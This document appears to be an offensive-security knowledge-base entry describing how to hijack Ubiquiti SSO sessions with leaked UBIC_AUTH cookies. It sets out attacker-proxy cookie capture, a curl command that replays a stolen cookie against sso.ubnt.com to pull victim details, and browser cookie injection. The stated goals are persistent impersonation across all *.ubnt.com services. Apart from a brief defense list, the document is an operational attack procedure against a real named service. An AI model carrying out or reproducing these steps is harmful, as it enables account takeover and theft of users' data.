---
id: proc-hijack-sessions-ubnt
tags:
  - session-hijacking
  - auth-bypass
type: procedure
tools:
  - '[[tools/Intercepting-Proxy]]'
  - '[[tools/cURL]]'
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:31:43.054Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Hijack-Sessions-Using-Leaked-Cookies

## Summary

Use captured session cookies to impersonate users and access SSO-protected services across the domain.

## Description

From logs, extract UBIC_AUTH and use it in requests to sso.ubnt.com API or inject into browser for full access to Ubiquiti services like account and store.

## Requirements

1. Leaked cookie value
2. HTTP client or proxy for injection
3. Target SSO endpoints

## Defense

Defensive measures and detection strategies:

- Use HttpOnly and Secure flags effectively
- Implement session fingerprinting and IP binding
- Log and alert on anomalous session usage

## Objectives

1. Fetch victim user data via API
2. Establish persistent impersonation
3. Access all *.ubnt.com services

## Instructions

### Step 1: Proxy Capture

**Context**: Monitor requests to log cookies using Burp or similar.

Configure [[tools/Intercepting-Proxy]] to route through attacker's server; expected: UBIC_AUTH in request headers.

### Step 2: Replay Cookie

**Context**: Test access with cURL.

```bash
curl -H "Cookie: UBIC_AUTH=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." https://sso.ubnt.com/api/sso/v1/user/self
```

> Returns JSON with user details; success: 200 OK with victim info.

### Step 3: Browser Injection

**Context**: Set cookie for manual browsing.

Use dev tools: document.cookie = "UBIC_AUTH=leaked_value"; or proxy response with Set-Cookie header.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Intercepting-Proxy]]
- [[tools/cURL]]

## Tags

- session-hijacking
- auth-bypass
